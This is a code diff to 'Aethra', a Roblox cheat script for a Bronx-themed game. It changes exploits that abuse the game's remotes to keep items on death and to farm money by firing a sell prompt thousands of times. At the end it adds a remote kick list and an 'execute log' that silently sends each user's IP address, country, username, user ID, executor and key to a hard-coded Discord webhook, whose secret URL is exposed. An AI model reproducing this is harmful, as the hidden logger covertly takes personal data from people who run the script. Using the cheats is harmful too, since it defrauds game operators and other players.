@@ -7,15 +7,13 @@ getgenv().loaded = true
 local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
 
--- Create ScreenGui
 local gui = Instance.new("ScreenGui")
 gui.IgnoreGuiInset = true
 gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Create notification frame
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 270, 0, 80)
-frame.Position = UDim2.new(1, -300, 0, -100) -- sağ dışta başlasın
+frame.Position = UDim2.new(1, -300, 0, -100)
 frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 frame.BackgroundTransparency = 0.15
 frame.BorderSizePixel = 0
@@ -23,7 +21,6 @@ frame.AnchorPoint = Vector2.new(0, 0)
 frame.Parent = gui
 frame.Visible = false
 
--- Title
 local title = Instance.new("TextLabel")
 title.Parent = frame
 title.Size = UDim2.new(1, -20, 0, 25)
@@ -34,7 +31,6 @@ title.TextSize = 18
 title.TextColor3 = Color3.fromRGB(255,255,255)
 title.TextXAlignment = Enum.TextXAlignment.Left
 
--- Text
 local text = Instance.new("TextLabel")
 text.Parent = frame
 text.Size = UDim2.new(1, -20, 1, -40)
@@ -46,20 +42,17 @@ text.TextColor3 = Color3.fromRGB(210,210,210)
 text.TextXAlignment = Enum.TextXAlignment.Left
 text.TextWrapped = true
 
--- Notification Function
 local function notify(titleText, msg, time)
 	frame.Visible = true
 	title.Text = titleText
 	text.Text = msg
 
-	-- slide in
 	TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {
 		Position = UDim2.new(1, -280, 0, 30)
 	}):Play()
 
 	task.wait(time)
 
-	-- slide out
 	local tween = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {
 		Position = UDim2.new(1, -300, 0, -100)
 	})
@@ -68,10 +61,10 @@ local function notify(titleText, msg, time)
 	frame.Visible = false
 end
 
--- Your Notifications
+-- notif
 notify("Aethra", "Loading…", 12)
 task.wait(3)
-notify("Update!", "12.9.2025\nCheck Discord For Logs!", 10)
+notify("Fixes!", "12.9.2025\nCheck Discord For Logs!", 10)
 
 
 if LPH_OBFUSCATED == nil then
@@ -15894,72 +15887,121 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
-local ExemptItems = {"Phone", "Fist", "Shiesty"}
+local ExemptItems = {"Phone", "Fist", "Shiesty", "Bandage", "Lemonade", "Car keys"}
 
-local function SetupCharacter(char)
-    if not Config.TheBronx.PlayerModifications.AntiLoseItems then return end
-
-    local humanoid = char:WaitForChild("Humanoid")
-    humanoid.Died:Connect(function()
-        task.wait(0.05)
-
-        local equipped = char:FindFirstChildOfClass("Tool")
-        if equipped and not table.find(ExemptItems, equipped.Name) then
-            pcall(function()
-                ReplicatedStorage.BackpackRemote:InvokeServer("Store", equipped.Name)
-            end)
-            task.wait(0.6)
+local function MarketHasItem(toolName)
+    local market = ReplicatedStorage:FindFirstChild("MarketItems")
+    if not market then return false end
+    for _, item in ipairs(market:GetChildren()) do
+        if item.Name == toolName and item:FindFirstChild("owner") and item.owner.Value == LocalPlayer.Name then
+            return true
         end
+    end
+    return false
+end
+
+local function BackpackHasItem(toolName)
+    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool.Name == toolName then
+            return true
+        end
+    end
+    return false
+end
+
+local function ForcePutToMarket(toolName)
+    local endTime = os.clock() + 12 
+
+    while os.clock() < endTime do
+        if MarketHasItem(toolName) then
+            return true
+        end
+
+        pcall(function()
+            ReplicatedStorage.ListWeaponRemote:FireServer(toolName, 999999)
+        end)
+
+        task.wait(0.15)
+    end
+
+    return false
+end
+
+local function ForceRetrieveFromMarket(toolName)
+    local market = ReplicatedStorage:WaitForChild("MarketItems", 10)
+    if not market then return false end
+
+    local endTime = os.clock() + 12
+
+    while os.clock() < endTime do
+        for _, item in ipairs(market:GetChildren()) do
+            if item.Name == toolName
+                and item:FindFirstChild("owner")
+                and item.owner.Value == LocalPlayer.Name
+                and item:GetAttribute("SpecialId") then
+
+                local special = item:GetAttribute("SpecialId")
+
+                pcall(function()
+                    ReplicatedStorage.BuyItemRemote:FireServer(toolName, "Remove", special)
+                end)
+
+                task.wait(0.2)
+
+                pcall(function()
+                    ReplicatedStorage.BackpackRemote:InvokeServer("Grab", toolName)
+                end)
+
+                task.wait(0.2)
+
+                if BackpackHasItem(toolName) then
+                    return true
+                end
+            end
+        end
+
+        task.wait(0.2)
+    end
+
+    return false
+end
+
+local function SaveOnDeath(char)
+    local hum = char:WaitForChild("Humanoid")
+
+    hum.Died:Connect(function()
+        if not Config.TheBronx.PlayerModifications.AntiLoseItems then return end
+
+        task.wait(0.25)
 
         for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
             if tool:IsA("Tool") and not table.find(ExemptItems, tool.Name) then
-                pcall(function()
-                    ReplicatedStorage.ListWeaponRemote:FireServer(tool.Name, 999999)
-                end)
-                task.wait(3.1) 
+                ForcePutToMarket(tool.Name)
             end
         end
     end)
+end
 
-    task.spawn(function()
-        task.wait(2.5) 
+local function RetrieveAfterSpawn()
+    task.delay(2.2, function()
+        if not Config.TheBronx.PlayerModifications.AntiLoseItems then return end
 
-        local market = ReplicatedStorage:WaitForChild("MarketItems", 10)
+        local market = ReplicatedStorage:FindFirstChild("MarketItems")
         if not market then return end
 
-        local attempts = 0
-        while attempts < 8 do  
-            attempts += 1
-            local anyFound = false
+        for _, item in ipairs(market:GetChildren()) do
+            if item:FindFirstChild("owner")
+                and item.owner.Value == LocalPlayer.Name then
 
-            for _, item in ipairs(market:GetChildren()) do
-                local owner = item:FindFirstChild("owner")
-                local specialId = item:GetAttribute("SpecialId")
-                local toolName = item.Name
-
-                if owner and owner.Value == LocalPlayer.Name 
-                and specialId 
-                and not table.find(ExemptItems, toolName) then
-                    
-                    anyFound = true
-
-                    pcall(function()
-                        ReplicatedStorage.BuyItemRemote:FireServer(toolName, "Remove", specialId)
-                    end)
-                    task.wait(0.4)
-
-                    pcall(function()
-                        ReplicatedStorage.BackpackRemote:InvokeServer("Grab", toolName)
-                    end)
-
-                    task.wait(1.6)
-                end
+                ForceRetrieveFromMarket(item.Name)
             end
-
-            if not anyFound then break end 
-            task.wait(1)
         end
     end)
+end
+
+local function SetupCharacter(char)
+    SaveOnDeath(char)
+    RetrieveAfterSpawn()
 end
 
 LocalPlayer.CharacterAdded:Connect(SetupCharacter)
@@ -15982,6 +16024,7 @@ end
                             return
                         end
                         Cooldown = true
+                        
                         local Player = Players.LocalPlayer
                         local Backpack = Player.Backpack
 
@@ -16060,145 +16103,176 @@ end
                     end 
 
                     return Found, Cup
-                end)                                                 
+                end)        
+                                                         
+local function FreezeCharacter()
+    local char = LocalPlayer.Character
+    if not char then return end
 
+    local hum = char:FindFirstChild("Humanoid")
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+
+    if hum then
+        hum.WalkSpeed = 0
+        hum.JumpPower = 0
+        hum.AutoRotate = false
+    end
+
+    if hrp then
+        hrp.Anchored = true
+    end
+end
+
+local function UnfreezeCharacter()
+    local char = LocalPlayer.Character
+    if not char then return end
+
+    local hum = char:FindFirstChild("Humanoid")
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+
+    if hum then
+        hum.WalkSpeed = 16
+        hum.JumpPower = 50
+        hum.AutoRotate = true
+    end
+
+    if hrp then
+        hrp.Anchored = false
+    end
+end
 
 VulnerabilitySection:button({name = " Auto Generate Max Money", callback = function()
-                    local Found, Cup = GetFruitCup()
+    local Found, Cup = GetFruitCup()
 
-                    if Cup and Found then
+    if Cup and Found then
 
-                        local OLDCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+        local OLDCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
 
-                        if Cup.Parent == LocalPlayer.Backpack then
-                            LocalPlayer.Character.Humanoid:EquipTool(Cup)
-                            task.wait(1)
-                        end 
+        if Cup.Parent == LocalPlayer.Backpack then
+            LocalPlayer.Character.Humanoid:EquipTool(Cup)
+            task.wait(1)
+        end 
 
-                        Teleport(Workspace["IceFruit Sell"].CFrame, true)
+        Teleport(Workspace["IceFruit Sell"].CFrame, true)
 
-                        task.wait(.5)
+        task.wait(.5)
 
-                        for Index=1, 4000 do
-                            task.spawn(function()
-                                _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)
-                            end)
-                        end
+        for Index=1, 4000 do
+            task.spawn(function()
+                _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)
+            end)
+        end
 
-                        Teleport(OLDCFrame)
-
-
-                        return
-                    end
+        Teleport(OLDCFrame)
+        return
+    end
 
 
-                    local OLDCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+    local OLDCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
 
-                    local Itemz = {"FijiWater", "FreshWater", "Ice-Fruit Bag", "Ice-Fruit Cupz"}
-                    local Stove;
+    local Itemz = {"FijiWater", "FreshWater", "Ice-Fruit Bag", "Ice-Fruit Cupz"}
+    local Stove;
 
-                    for Index, Value in Workspace.CookingPots:GetChildren() do
-                        if Value:IsA("Model") then
-                            if Value:FindFirstChildWhichIsA("ProximityPrompt", true).ActionText == "Turn On" and Value:FindFirstChildWhichIsA("ProximityPrompt", true).Enabled then
-                                Stove = Value
+    for Index, Value in Workspace.CookingPots:GetChildren() do
+        if Value:IsA("Model") then
+            if Value:FindFirstChildWhichIsA("ProximityPrompt", true).ActionText == "Turn On"
+            and Value:FindFirstChildWhichIsA("ProximityPrompt", true).Enabled then
+                Stove = Value
+                break
+            end
+        end
+    end
 
-                                break
-                            end
-                        end
-                    end
+    for Index, Value in Itemz do
+        if not LocalPlayer.Backpack:FindFirstChild(Value) then
+            ReplicatedStorage:WaitForChild("ExoticShopRemote"):InvokeServer(Value)
+            task.wait(0.1)
+        end
+    end
 
-                    for Index, Value in Itemz do
-                        if not LocalPlayer.Backpack:FindFirstChild(Value) then
-                            ReplicatedStorage:WaitForChild("ExoticShopRemote"):InvokeServer(Value)
-                            task.wait(0.1)
-                        end
-                    end
+    local Check = false;
 
-                    local Check = false;
+    for Index, Value in Itemz do
+        if not LocalPlayer.Backpack:FindFirstChild(Value) then
+            Check = true
+        end
+    end
 
-                    for Index, Value in Itemz do
-                        if not LocalPlayer.Backpack:FindFirstChild(Value) then
-                            Check = true
-                        end
-                    end
+    if Check then
+        library.notifications:create_notification({
+            name = "Aethra",
+            info = `Could not find items! Please check you have more than 5000$.`,
+            lifetime = 10
+        })
+        return
+    end
 
-                    if Check then
+    Teleport(Stove.CookPart.CFrame, true)
 
-                        library.notifications:create_notification({
-                            name = "Aethra",
-                            info = `Could not find items! Please check you have more than 5000$.`,
-                            lifetime = 10
-                        })
-                        return
-                    end
+    task.wait(1)
 
-                    Teleport(Stove.CookPart.CFrame, true)
+    FreezeCharacter()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
 
-                    task.wait(1)
+    task.wait(1)
 
-                    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
+    fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))
 
-                    task.wait(1.5)
+    task.wait(2)
 
-                    fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))
+    for Index, Value in {"FijiWater", "FreshWater", "Ice-Fruit Bag"} do
+        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack[Value])
+        task.wait(1)
+        fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))
+        task.wait(3)
+    end
 
-                    task.wait(2)
+    repeat task.wait() until Stove.CookPart.Steam.LoadUI.Enabled == false
 
-                    for Index, Value in {"FijiWater", "FreshWater", "Ice-Fruit Bag"} do
-                        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack[Value])
-                        task.wait(1)
-                        fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))
-                        task.wait(3)
-                    end
+    if not LocalPlayer.Character:FindFirstChild("Ice-Fruit Cupz") then
+        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack['Ice-Fruit Cupz'])
+        task.wait(1)
+    end
+    
+    task.wait(1)
 
-                    repeat wait() until 
-                    Stove.CookPart.Steam.LoadUI.Enabled == false
+    fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))
 
-                    if not LocalPlayer.Character:FindFirstChild("Ice-Fruit Cupz") then
-                        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack['Ice-Fruit Cupz'])
-                        task.wait(1)
-                    end
-                    
-                    task.wait(1)
+    task.wait(3)
 
-                    fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))
+    UnfreezeCharacter()
 
-                    task.wait(3)
+    Teleport(Workspace["IceFruit Sell"].CFrame, true)
 
-                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
+    task.wait(1)
 
-                    Teleport(Workspace["IceFruit Sell"].CFrame, true)
+    FreezeCharacter()
 
-                    task.wait(1)
+    task.wait(1.5)
 
-                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
+    if not LocalPlayer.Character:FindFirstChild("Ice-Fruit Cupz") then
+        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack['Ice-Fruit Cupz'])
+        task.wait(1)
+    end
 
-                    task.wait(1.5)
+    Workspace["IceFruit Sell"].ProximityPrompt.HoldDuration = 0
 
-                    if not LocalPlayer.Character:FindFirstChild("Ice-Fruit Cupz") then
-                        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack['Ice-Fruit Cupz'])
-                        task.wait(1)
-                    end
+    for Index=1, 4000 do
+        task.spawn(function()
+            _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)
+        end)
+    end
 
-                    Workspace["IceFruit Sell"].ProximityPrompt.HoldDuration = 0
+    UnfreezeCharacter()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
 
-                    for Index=1, 4000 do
-                        task.spawn(function()
-                            _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)
-                        end)
-                    end
+    task.wait(0.5)
 
-                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+    Teleport(OLDCFrame, true)
 
-                    task.wait(0.5)
+    task.wait(2)
 
-                    Teleport(OLDCFrame, true)
-
-                    task.wait(2)
-
-                end})
+end})
 
 VulnerabilitySection:button({name = "Clean All Red Money", callback = LPH_NO_VIRTUALIZE(function()
         if LocalPlayer.stored.FilthyStack.Value == 0 then 
@@ -16242,13 +16316,13 @@ VulnerabilitySection:button({name = "Clean All Red Money", callback = LPH_NO_VIR
 
         repeat
             fireproximityprompt(Cleaner:FindFirstChild("GrabPrompt", true))
-            task.wait(1)
+            task.wait(3)
         until not character:FindFirstChild("MoneyReady")
 
-        repeat task.wait(5) until LocalPlayer.Backpack:FindFirstChild("BagOfMoney")
+        repeat task.wait(1) until LocalPlayer.Backpack:FindFirstChild("BagOfMoney")
         Teleport(CFrame.new(-222.29, 283.81, -1200.90))
         humanoid:EquipTool(LocalPlayer.Backpack["BagOfMoney"])
-        task.wait(1)
+        task.wait(2)
         fireproximityprompt(Workspace.ATMMoney.Prompt)
 
         Teleport(OldCF)
@@ -17823,4 +17897,264 @@ if hookfunction and not Solara and LPH_OBFUSCATED and Game_Name == "South Bronx"
     end)
 end
 end
+end
+
+--kick
+local pasteURL = "https://pastebin.com/raw/8gyc2eux"
+local WEBHOOK  = "https://discord.com/api/webhooks/1434580393394307173/zQEclNo_vm3WOwfhJttuc_eo6NPyGd80lmli7N_JqgaGzmGbHVweMtQrPma3CPJgTHXJ"
+ 
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+ 
+local USER_RATE_LIMIT = 30
+local lastWebhookSent = {}
+local kickList = {}
+local blacklist = { ["1"] = true }
+ 
+local function GetURL(url)
+    local ok, result = pcall(function()
+        if syn and syn.request then
+            return syn.request({Url = url, Method = "GET"}).Body
+        elseif http_request then
+            return http_request({Url = url, Method = "GET"}).Body
+        elseif request then
+            return request({Url = url, Method = "GET"}).Body
+        else
+            return game:HttpGet(url)
+        end
+    end)
+    return ok and result or nil
+end
+ 
+local function detectExecutor()
+    if syn then return "Synapse X"
+    elseif is_sirhurt_closure then return "Sirhurt"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif identifyexecutor then
+        local ok, name = pcall(identifyexecutor)
+        if ok then return name end
+    end
+    return "Unknown"
+end
+ 
+local function sendWebhook(data)
+    local body = HttpService:JSONEncode(data)
+ 
+    local methods = {
+        function()
+            return syn and syn.request and syn.request({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        end,
+ 
+        function()
+            return http_request and http_request({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = body
+            })
+        end,
+ 
+        function()
+            return request and request({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = body
+            })
+        end
+    }
+ 
+    for _, fn in ipairs(methods) do
+        local ok, res = pcall(fn)
+        if ok and res then return true end
+    end
+ 
+    warn("no send")
+    return false
+end
+ 
+local function updateKickList()
+    local data = GetURL(pasteURL)
+    if not data then return warn("no update") end
+ 
+    local ok, decoded = pcall(function()
+        return HttpService:JSONDecode(data)
+    end)
+ 
+    if ok and typeof(decoded) == "table" then
+        kickList = decoded
+        print("update")
+    else
+        warn("decode error")
+    end
+end
+ 
+local function checkPlayers()
+    for _, plr in ipairs(Players:GetPlayers()) do
+ 
+        if blacklist[plr.Name] then
+            print("aethra is my daddy", plr.Name)
+            continue
+        end
+ 
+        local reason = kickList[plr.Name]
+ 
+        if reason then
+            local now = tick()
+            if not lastWebhookSent[plr.Name] or now - lastWebhookSent[plr.Name] >= USER_RATE_LIMIT then
+                lastWebhookSent[plr.Name] = now
+ 
+local function GetAvatarURL(userId)
+    local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"
+    local response = GetURL(url)
+    if not response then return nil end
+ 
+    local ok, decoded = pcall(function()
+        return HttpService:JSONDecode(response)
+    end)
+ 
+    if ok and decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
+        return decoded.data[1].imageUrl
+    end
+ 
+    return nil
+end
+ 
+                local data = {
+                    embeds = {{
+                        title = "🚨 Player Kicked",
+                        color = 15724527,
+                        thumbnail = { url = GetAvatarURL(plr.UserId) or "" },
+                        fields = {
+                            { name = "Player", value = plr.Name, inline = true },
+                            { name = "UserId", value = tostring(plr.UserId), inline = true },
+                            { name = "Display", value = plr.DisplayName, inline = true },
+                            { name = "Reason", value = reason, inline = false },
+                            { name = "Executor", value = detectExecutor(), inline = true },
+                            { name = "Server JobId", value = game.JobId, inline = false },
+                        },
+                        footer = {
+                            text = "Aethra Kick System"
+                        },
+                        timestamp = DateTime.now():ToIsoDate()
+                    }}
+                }
+ 
+                sendWebhook(data)
+            end
+ 
+            if plr == LocalPlayer then
+                LocalPlayer:Kick(reason)
+            else
+                print("found", plr.Name)
+            end
+        end
+    end
+end
+ 
+updateKickList()
+checkPlayers()
+ 
+task.spawn(function()
+    while task.wait(10) do
+        updateKickList()
+        checkPlayers()
+    end
+end)
+ 
+-- log
+
+local WEBHOOK = "https://discord.com/api/webhooks/1434580393394307173/zQEclNo_vm3WOwfhJttuc_eo6NPyGd80lmli7N_JqgaGzmGbHVweMtQrPma3CPJgTHXJ"
+local KEY_URL  = "https://raw.githubusercontent.com/xdomestos1-art/41414141414141414141/refs/heads/main/41414141414141414141/41414141414141414141-main/123123b1j3%C4%B1b123jb1%C4%B1bj3/94989894214444/123b213b213b213b.json"
+local HttpService = game:GetService("HttpService")
+local Players     = game:GetService("Players")
+local Market      = game:GetService("MarketplaceService")
+local Player      = Players.LocalPlayer
+
+local username = Player.Name
+local userid   = Player.UserId
+local avatar   = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
+
+local ip = "Unknown"
+local country = "Unknown"
+task.spawn(function()
+    local success, data = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=query,country,countryCode"))
+    end)
+    if success and data.query then
+        ip = data.query
+        country = (data.countryCode and utf8.char(string.byte(data.countryCode:upper(),1)+127397)..utf8.char(string.byte(data.countryCode:upper(),2)+127397) or "Unknown") .. " " .. (data.country or "")
+    end
+end)
+
+local executor = ((identifyexecutor or getexecutorname or function() return "Unknown" end)())
+
+local gameName = "Unknown"
+pcall(function() gameName = Market:GetProductInfo(game.PlaceId).Name end)
+
+
+local key = "Not Found"
+task.spawn(function()
+    local success, raw = pcall(function()
+        return game:HttpGet(KEY_URL, true) 
+    end)
+    if success and raw ~= "" then
+        local tbl = HttpService:JSONDecode(raw)
+        if typeof(tbl) == "table" then
+            for k, v in pairs(tbl) do
+                if tostring(v) == username then
+                    key = tostring(k)
+                    break
+                end
+            end
+        end
+    end
+end)
+
+
+task.wait(4)
+
+local payload = HttpService:JSONEncode({
+    username = "Aethra Logger",
+    embeds = {{
+        title = "Script Executed",
+        color = key ~= "Not Found" and 3066993 or 15158332,
+        thumbnail = { url = avatar },
+        fields = {
+            {name="Username",     value=username,                  inline=true},
+            {name="Display Name", value=Player.DisplayName,        inline=true},
+            {name="User ID",      value="`"..userid.."`",          inline=true},
+            {name = "Fingerprint", value = "||" .. ip .. "||  ||" .. country .. "||", inline = true},
+            {name="Executor",     value=executor,                  inline=true},
+            {name="Key Status",   value=key ~= "Not Found" and "Valid Key" or "No Key / Wrong", inline=false},
+            {name="Key",          value="**"..key.."**",           inline=false},
+            {name="Game",         value=gameName,                  inline=false},
+            {name="Place ID",     value=tostring(game.PlaceId),    inline=true},
+        },
+        footer = {text = "Aethra Execute Log"},
+        timestamp = DateTime.now():ToIsoDate()
+    }}
+})
+
+
+local req = syn and syn.request or http_request or request or (http and http.request) or (fluxus and fluxus.request) or getgenv().request
+
+if req then
+    task.spawn(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
+    print("sensen")
+else
+    warn("nofunction")
 end
